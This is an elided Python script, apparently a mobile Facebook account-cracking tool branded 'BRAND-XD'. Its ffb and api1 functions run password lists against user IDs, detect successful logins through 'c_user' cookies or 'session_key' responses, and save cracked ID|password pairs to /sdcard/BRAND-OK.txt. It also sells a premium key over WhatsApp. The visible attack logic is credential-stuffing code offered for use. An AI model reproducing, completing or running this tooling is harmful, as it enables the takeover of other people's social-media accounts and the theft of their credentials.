...
\033[97;1m>>     Version  :\033[1;32m 1.0.0
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/groups/672751520627850/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.facebook.com/groups/672751520627850/');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/groups/672751520627850/');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
                        ...
                        linex()
                        tks = ("Hi Sk Sir, I Need To Buy Your Paid BRAND PRO Tools Version 1.0.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python BRAND.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;97m [BRAND-XD] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Sk:
                                ...
                                if 'y' in pcp:
                                        print('\r\033[1;91m BRAND-CP '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mBRAND-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BRAND-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                print('\r\r\033[1;32mBRAND-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BRAND-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
